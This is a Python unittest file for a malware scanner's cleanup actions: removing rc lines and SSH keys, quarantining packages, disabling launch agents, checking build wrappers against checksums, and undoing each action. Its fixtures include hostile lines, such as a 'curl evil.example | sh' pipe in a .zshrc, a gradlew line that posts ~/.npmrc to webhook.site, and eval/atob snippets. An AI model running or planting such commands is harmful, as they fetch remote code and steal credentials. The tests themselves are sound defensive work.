import hashlib
import os
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from scs.malware import actions, quarantine


def write(path: Path, text, mode=None) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    (path.write_bytes if isinstance(text, bytes) else path.write_text)(text)
    if mode:
        path.chmod(mode)
    return path


def finding(check, title, path, rules=(), **kw):
    return {"check": check, "severity": kw.pop("severity", "high"), "title": title, "path": str(path),
            "rules": list(rules), "evidence": kw.pop("evidence", []), "advice": "", "quarantinable": kw.pop("quarantinable", False),
            "new": False, "meta": kw.pop("meta", {})}


def ids(f):
    return [a.id for a in actions.available(f)]


class ActionTestCase(unittest.TestCase):
    def setUp(self):
        self.d = Path(tempfile.mkdtemp())
        self.env = mock.patch.dict(os.environ, {"XDG_DATA_HOME": str(self.d / "data")})
        self.env.start()
        self.home = mock.patch.object(actions, "HOME", str(self.d))
        self.home.start()

    def tearDown(self):
        self.env.stop()
        self.home.stop()
        shutil.rmtree(self.d, ignore_errors=True)


class LineAndFileTests(ActionTestCase):
    def test_remove_rc_line_and_undo(self):
        rc = write(self.d / ".zshrc", "export A=1\ncurl -s http://evil.example/x | sh\nalias ll='ls -l'\n")
        f = finding("persistence", ".zshrc line 2", rc, ["REMOTE_PIPE_SHELL"], meta={"line": "curl -s http://evil.example/x | sh"})
        self.assertEqual(ids(f), ["remove_line"])
        rec = actions.apply(f, "remove_line")
        self.assertEqual(rc.read_text(), "export A=1\nalias ll='ls -l'\n")
        self.assertEqual(actions.describe(f)["done"]["label"], "Remove this line")
        self.assertEqual(actions.describe(f)["actions"], [])  # handled: no more buttons
        actions.undo(rec["id"])
        self.assertIn("evil.example", rc.read_text())
        self.assertIsNone(actions.describe(f)["done"])
        with self.assertRaises(actions.ActionError):
            actions.undo(rec["id"])  # already undone

    def test_undo_refuses_when_file_changed_again(self):
        rc = write(self.d / ".bashrc", "good\nbad line\n")
        f = finding("persistence", ".bashrc line 2", rc, ["X"], meta={"line": "bad line"})
        rec = actions.apply(f, "remove_line")
        rc.write_text("good\nsomething new\n")
        with self.assertRaises(actions.ActionError):
            actions.undo(rec["id"])
        self.assertEqual(rc.read_text(), "good\nsomething new\n")  # newer content untouched

    def test_ssh_key(self):
        keys = write(self.d / ".ssh" / "authorized_keys", "ssh-ed25519 AAAAgood me@laptop\nssh-ed25519 AAAAbad attacker\n")
        f = finding("persistence", "SSH authorized key attacker", keys, ["NEW_SSH_KEY"],
                    meta={"line": "ssh-ed25519 AAAAbad attacker"})
        self.assertEqual([a.label for a in actions.available(f)], ["Remove this key"])
        actions.apply(f, "remove_line")
        self.assertEqual(keys.read_text(), "ssh-ed25519 AAAAgood me@laptop\n")

    def test_line_already_gone(self):
        rc = write(self.d / ".profile", "fine\n")
        with self.assertRaises(actions.ActionError):
            actions.apply(finding("persistence", ".profile line 9", rc, ["X"], meta={"line": "gone"}), "remove_line")
        self.assertEqual(list(actions.actions_dir().iterdir()), [])  # failed actions leave no record

    def test_quarantine_and_undo(self):
        bad = write(self.d / "proj" / "node_modules" / "evil" / "index.js", "eval(atob('x'))")
        f = finding("packages", "evil: suspicious install script", bad.parent, ["EVAL_DECODE"], quarantinable=True)
        self.assertEqual(ids(f), ["quarantine"])
        rec = actions.apply(f, "quarantine")
        self.assertFalse(bad.exists())
        self.assertEqual(len(quarantine.listing()), 1)
        self.assertEqual(actions.to_view(rec)["quarantine"], [quarantine.listing()[0]["id"]])
        actions.undo(rec["id"])
        self.assertTrue(bad.exists())

    def test_unknown_or_unavailable_action(self):
        rc = write(self.d / ".zshrc", "x\n")
        with self.assertRaises(actions.ActionError):
            actions.apply(finding("persistence", "t", rc, ["X"], meta={"line": "x"}), "quarantine")


class StartupItemTests(ActionTestCase):
    def test_launch_agent(self):
        plist = write(self.d / "Library" / "LaunchAgents" / "com.evil.plist", "<plist/>")
        prog = write(self.d / ".hidden" / "agent", "#!/bin/sh\n", 0o755)
        item = {"kind": "launchd", "path": str(plist), "label": "com.evil", "program": str(prog), "args": [str(prog)]}
        f = finding("persistence", "launchd: com.evil", plist, ["SUSPICIOUS_LOCATION"], meta={"item": item}, quarantinable=True)
        self.assertEqual(ids(f), ["disable_launchd", "quarantine_program"])  # no plain quarantine next to Disable
        calls = []
        with mock.patch.object(actions, "_run", side_effect=lambda cmd, **kw: calls.append(cmd) or
                               subprocess.CompletedProcess(cmd, 0, "", "")), \
                mock.patch.object(actions.os, "getuid", return_value=501, create=True):
            rec = actions.apply(f, "disable_launchd")
            self.assertFalse(plist.exists())
            actions.undo(rec["id"])
        self.assertTrue(plist.exists())
        self.assertEqual([c[:2] for c in calls], [["launchctl", "bootout"], ["launchctl", "bootstrap"]])

    def test_system_wide_items_get_steps_not_buttons(self):
        item = {"kind": "launchd", "path": "/Library/LaunchDaemons/com.evil.plist", "label": "com.evil", "program": "/x"}
        f = finding("persistence", "launchd: com.evil", "/Library/LaunchDaemons/com.evil.plist", ["X"], meta={"item": item})
        self.assertEqual(ids(f), [])
        self.assertIn("sudo launchctl bootout system", actions.manual_steps(f)[0]["cmd"])


class BuildChainTests(ActionTestCase):
    def props(self, extra=""):
        return write(self.d / "app" / "gradle" / "wrapper" / "gradle-wrapper.properties",
                     "distributionBase=GRADLE_USER_HOME\ndistributionUrl=https\\://services.gradle.org/distributions/"
                     f"gradle-8.13-bin.zip\nzipStorePath=wrapper/dists\n{extra}")

    def test_add_gradle_checksum(self):
        props = self.props()
        f = finding("buildchain", "Gradle download is not pinned by a checksum", props, ["WRAPPER_NO_CHECKSUM"], severity="info")
        self.assertEqual(ids(f), ["add_gradle_checksum"])
        digest = "a" * 64
        with mock.patch.object(actions, "_download", return_value=f"{digest}\n".encode()) as dl:
            rec = actions.apply(f, "add_gradle_checksum")
        dl.assert_called_once_with("https://services.gradle.org/distributions/gradle-8.13-bin.zip.sha256")
        self.assertIn(f"gradle-8.13-bin.zip\ndistributionSha256Sum={digest}\nzipStorePath", props.read_text())
        actions.undo(rec["id"])
        self.assertNotIn("distributionSha256Sum", props.read_text())

    def test_regenerate_gradle_wrapper_checks_the_checksum(self):
        self.props()
        jar = write(self.d / "app" / "gradle" / "wrapper" / "gradle-wrapper.jar", b"tampered")
        f = finding("buildchain", "Gradle wrapper jar does not match any Gradle release", jar, ["GRADLE_WRAPPER_MISMATCH"],
                    quarantinable=True)
        official = b"official jar"

        def fake_gradle(cmd, cwd=None, timeout=0):
            self.assertNotIn(str(self.d / "app"), cwd or "")  # never runs inside the project
            write(Path(cwd) / "gradle" / "wrapper" / "gradle-wrapper.jar", official)
            return subprocess.CompletedProcess(cmd, 0, "", "")
        with mock.patch.object(actions, "_trusted_gradle", return_value="/usr/local/bin/gradle"), \
                mock.patch.object(actions, "_git_restorable", return_value=False), \
                mock.patch.object(actions, "_run", side_effect=fake_gradle):
            self.assertEqual(ids(f), ["regenerate_gradle_wrapper", "quarantine"])
            with mock.patch("scs.malware.buildchain.gradle_wrapper_sums", return_value={"0" * 64}):
                with self.assertRaises(actions.ActionError):
                    actions.apply(f, "regenerate_gradle_wrapper")
                self.assertEqual(jar.read_bytes(), b"tampered")  # unverified jar is never used
            with mock.patch("scs.malware.buildchain.gradle_wrapper_sums", return_value={hashlib.sha256(official).hexdigest()}):
                rec = actions.apply(f, "regenerate_gradle_wrapper")
        self.assertEqual(jar.read_bytes(), official)
        actions.undo(rec["id"])
        self.assertEqual(jar.read_bytes(), b"tampered")

    def test_maven_wrapper_download_is_verified(self):
        jar = write(self.d / "m" / ".mvn" / "wrapper" / "maven-wrapper.jar", b"bad")
        write(jar.parent / "maven-wrapper.properties", "wrapperVersion=3.3.2\n")
        f = finding("buildchain", "Maven wrapper jar does not match the published one", jar, ["MAVEN_WRAPPER_MISMATCH"])
        good = b"good jar"
        with mock.patch("scs.malware.buildchain._central_sha1", return_value=hashlib.sha1(good).hexdigest()), \
                mock.patch.object(actions, "_download", return_value=b"evil"):
            with self.assertRaises(actions.ActionError):
                actions.apply(f, "replace_maven_wrapper")
        with mock.patch("scs.malware.buildchain._central_sha1", return_value=hashlib.sha1(good).hexdigest()), \
                mock.patch.object(actions, "_download", return_value=good):
            actions.apply(f, "replace_maven_wrapper")
        self.assertEqual(jar.read_bytes(), good)

    def test_pin_actions(self):
        wf = write(self.d / "repo" / ".github" / "workflows" / "ci.yml", "steps:\n"
                   "  - uses: actions/checkout@v4\n"
                   "  - uses: github/codeql-action/init@v3 # keep\n"
                   "  - uses: owner/gone@v1\n"
                   "  - uses: docker/login-action@650006c6eb7dba73a995cc03b0b2d7f5ca915bee # v3\n")
        f = finding("buildchain", "workflow ci.yml: 3 action(s) not pinned", wf, ["ACTION_NOT_PINNED"], severity="low")
        shas = {("actions/checkout", "v4"): "1" * 40, ("github/codeql-action", "v3"): "2" * 40}
        with mock.patch.object(actions, "_resolve_ref", side_effect=lambda r, ref: shas.get((r, ref))):
            rec = actions.apply(f, "pin_actions")
        text = wf.read_text()
        self.assertIn(f"uses: actions/checkout@{'1' * 40} # v4\n", text)
        self.assertIn(f"uses: github/codeql-action/init@{'2' * 40} # v3\n", text)
        self.assertIn("uses: owner/gone@v1\n", text)  # couldn't resolve: left alone
        self.assertIn("Review the change", actions.to_view(rec)["note"])

    def test_restore_from_git(self):
        if not shutil.which("git"):
            self.skipTest("git not installed")
        repo = self.d / "r"
        script = write(repo / "gradlew", "#!/bin/sh\nexec java -jar gradle/wrapper/gradle-wrapper.jar \"$@\"\n")
        env = {**os.environ, "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.com", "GIT_COMMITTER_NAME": "t",
               "GIT_COMMITTER_EMAIL": "t@example.com"}
        for cmd in (["init", "-q"], ["add", "gradlew"], ["commit", "-qm", "init"]):
            subprocess.run(["git", "-C", str(repo), *cmd], check=True, env=env)
        clean = script.read_text()
        script.write_text(clean + "curl -d @$HOME/.npmrc https://webhook.site/x\n")
        f = finding("buildchain", "suspicious code in gradlew (r)", script, ["EXFIL_SINK"])
        self.assertIn("restore_git", ids(f))
        rec = actions.apply(f, "restore_git")
        self.assertEqual(script.read_text(), clean)
        actions.undo(rec["id"])
        self.assertIn("webhook.site", script.read_text())


class PackageTests(ActionTestCase):
    def test_pip_reinstall_is_not_undoable_and_keeps_evidence(self):
        env = self.d / "venv"
        site = env / "lib" / "python3.12" / "site-packages"
        write(env / "bin" / "python3.12", "", 0o755)
        write(site / "requests" / "api.py", "import os; os.system('curl x|sh')")
        f = finding("integrity", "requests: 1 file(s) differ from the installed RECORD", site, ["RECORD_MISMATCH"],
                    meta={"package": "requests-2.31.0.dist-info", "modified": ["requests/api.py"], "missing": []})
        acts = actions.available(f)
        self.assertEqual([(a.id, a.undo, a.slow) for a in acts], [("reinstall_pip", False, True)])
        with mock.patch.object(actions, "_run", return_value=subprocess.CompletedProcess([], 0, "ok", "")) as run:
            rec = actions.apply(f, "reinstall_pip")
        self.assertEqual(run.call_args[0][0][1:], ["-m", "pip", "install", "--force-reinstall", "--no-deps", "--no-input",
                                                   "requests==2.31.0"])
        kept = actions.actions_dir() / rec["id"] / "changed-files" / "requests" / "api.py"
        self.assertTrue(kept.is_file())
        with self.assertRaises(actions.ActionError):
            actions.undo(rec["id"])


class ServerTests(ActionTestCase):
    def test_only_reported_items_and_listed_actions(self):
        import json
        from scs.ui.server import App
        rc = write(self.d / ".zshrc", "x\nbad\n")
        f = finding("persistence", ".zshrc line 2", rc, ["X"], meta={"line": "bad"})
        data = self.d / "data" / "scs"
        data.mkdir(parents=True, exist_ok=True)
        (data / "malware-latest.json").write_text(json.dumps({"started": "s", "findings": [f], "ignored": []}))
        app = App()
        item = next(i for i in app.malware()["items"] if i["title"] == ".zshrc line 2")
        self.assertEqual([a["id"] for a in item["actions"]], ["remove_line"])
        with self.assertRaises(ValueError):
            app.malware_act("persistence|made up|/etc/passwd", "remove_line")
        with self.assertRaises(ValueError):
            app.malware_act(item["id"], "quarantine")
        done = app.malware_act(item["id"], "remove_line")["done"]
        self.assertEqual(rc.read_text(), "x\n")
        self.assertEqual(app.malware()["actions"][0]["id"], done["id"])
        app.malware_undo(done["id"])
        self.assertEqual(rc.read_text(), "x\nbad\n")


if __name__ == "__main__":
    unittest.main()
